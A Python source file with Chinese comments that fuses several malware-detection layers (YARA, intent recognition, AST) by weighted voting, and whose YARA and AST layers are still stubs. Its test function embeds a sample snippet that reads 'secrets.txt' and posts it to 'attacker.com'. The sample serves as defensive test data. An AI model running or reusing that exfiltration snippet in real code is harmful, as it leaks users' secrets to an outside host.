#!/usr/bin/env python3
"""
多层检测融合器
融合 YARA/意图/AST/控制流等多层检测结果
"""

import json
from pathlib import Path
from typing import Dict, List, Optional
from dataclasses import dataclass
from datetime import datetime


@dataclass
class DetectionResult:
    """单层检测结果"""
    layer_name: str
    is_malicious: bool
    confidence: float
    reason: str
    details: Dict
    
    def to_dict(self) -> Dict:
        return {
            'layer': self.layer_name,
            'is_malicious': self.is_malicious,
            'confidence': self.confidence,
            'reason': self.reason,
            'details': self.details,
        }


@dataclass
class FusionResult:
    """融合结果"""
    is_malicious: bool
    confidence: float
    layer_results: List[DetectionResult]
    decision_reason: str
    timestamp: str
    
    def to_dict(self) -> Dict:
        return {
            'is_malicious': self.is_malicious,
            'confidence': self.confidence,
            'layer_results': [r.to_dict() for r in self.layer_results],
            'decision_reason': self.decision_reason,
            'timestamp': self.timestamp,
        }


class MultiLayerFusion:
    """多层检测融合器"""
    
    def __init__(self, weights: Optional[Dict[str, float]] = None):
        # 各层权重
        self.weights = weights or {
            'yara': 0.30,       # YARA 规则
            'intent': 0.20,     # 意图识别
            'ast': 0.20,        # AST 分析
            'cfg': 0.15,        # 控制流
            'semantic': 0.10,   # 语义分析
            'behavior': 0.05,   # 行为分析
        }
    
    def fuse(self, results: List[DetectionResult]) -> FusionResult:
        """融合多层检测结果"""
        
        # 1. 加权投票
        total_weight = 0.0
        weighted_malicious = 0.0
        weighted_confidence = 0.0
        
        for result in results:
            weight = self.weights.get(result.layer_name, 0.1)
            total_weight += weight
            
            if result.is_malicious:
                weighted_malicious += weight
            
            weighted_confidence += result.confidence * weight
        
        # 2. 计算融合置信度
        if total_weight > 0:
            fusion_confidence = weighted_confidence / total_weight
        else:
            fusion_confidence = 0.0
        
        # 3. 投票决策 (超过一半权重认为恶意则判定恶意)
        is_malicious = weighted_malicious >= total_weight / 2
        
        # 4. 生成决策原因
        malicious_layers = [r.layer_name for r in results if r.is_malicious]
        if malicious_layers:
            decision_reason = f"检测到恶意行为：{', '.join(malicious_layers)}"
        else:
            decision_reason = "未检测到明显恶意行为"
        
        return FusionResult(
            is_malicious=is_malicious,
            confidence=fusion_confidence,
            layer_results=results,
            decision_reason=decision_reason,
            timestamp=datetime.now().isoformat(),
        )
    
    def analyze(self, code: str, code_path: str) -> FusionResult:
        """完整分析流程"""
        
        results = []
        
        # Layer 1: YARA 规则
        yara_result = self._analyze_yara(code, code_path)
        results.append(yara_result)
        
        # Layer 2: 意图识别
        intent_result = self._analyze_intent(code)
        results.append(intent_result)
        
        # Layer 3: AST 分析 (待实现)
        # ast_result = self._analyze_ast(code)
        # results.append(ast_result)
        
        # 融合结果
        fusion = self.fuse(results)
        
        return fusion
    
    def _analyze_yara(self, code: str, code_path: str) -> DetectionResult:
        """Layer 1: YARA 规则分析"""
        # 简化实现，实际应该调用 YARA 扫描器
        is_malicious = False
        confidence = 0.0
        reason = "YARA 规则未匹配"
        
        # TODO: 集成真实 YARA 扫描
        # from scanner import YaraScanner
        # scanner = YaraScanner()
        # matched, rules = scanner.scan(code_path)
        
        return DetectionResult(
            layer_name='yara',
            is_malicious=is_malicious,
            confidence=confidence,
            reason=reason,
            details={},
        )
    
    def _analyze_intent(self, code: str) -> DetectionResult:
        """Layer 2: 意图识别"""
        from layers.layer2_intent import IntentDetectionLayer
        
        layer = IntentDetectionLayer()
        result = layer.analyze(code)
        
        return DetectionResult(
            layer_name='intent',
            is_malicious=result.is_malicious,
            confidence=result.confidence,
            reason=f"检测到{result.intent.value if result.intent else '无'}意图",
            details=result.to_dict(),
        )
    
    def _analyze_ast(self, code: str) -> DetectionResult:
        """Layer 3: AST 分析 (待实现)"""
        # TODO: 实现 AST 分析
        return DetectionResult(
            layer_name='ast',
            is_malicious=False,
            confidence=0.0,
            reason="AST 分析未实现",
            details={},
        )


def main():
    """主函数 - 测试"""
    
    print("="*60)
    print("🔀 多层检测融合器测试")
    print("="*60)
    
    fusion = MultiLayerFusion()
    
    # 测试用例 1: 恶意代码
    print("\n测试 1: 恶意代码")
    code1 = """
    import requests
    data = open('secrets.txt').read()
    requests.post('http://attacker.com/collect', data=data)
    """
    result1 = fusion.analyze(code1, "test1.py")
    print(f"恶意：{result1.is_malicious}")
    print(f"置信度：{result1.confidence:.2f}")
    print(f"原因：{result1.decision_reason}")
    
    for layer_result in result1.layer_results:
        print(f"  - {layer_result.layer_name}: {'恶意' if layer_result.is_malicious else '正常'} ({layer_result.confidence:.2f})")
    
    # 测试用例 2: 正常代码
    print("\n测试 2: 正常代码")
    code2 = """
    def add(a, b):
        return a + b
    
    result = add(1, 2)
    print(result)
    """
    result2 = fusion.analyze(code2, "test2.py")
    print(f"恶意：{result2.is_malicious}")
    print(f"置信度：{result2.confidence:.2f}")
    print(f"原因：{result2.decision_reason}")
    
    for layer_result in result2.layer_results:
        print(f"  - {layer_result.layer_name}: {'恶意' if layer_result.is_malicious else '正常'} ({layer_result.confidence:.2f})")
    
    print("\n" + "="*60)
    print("✅ 多层检测融合器测试完成")
    print("="*60)


if __name__ == '__main__':
    main()
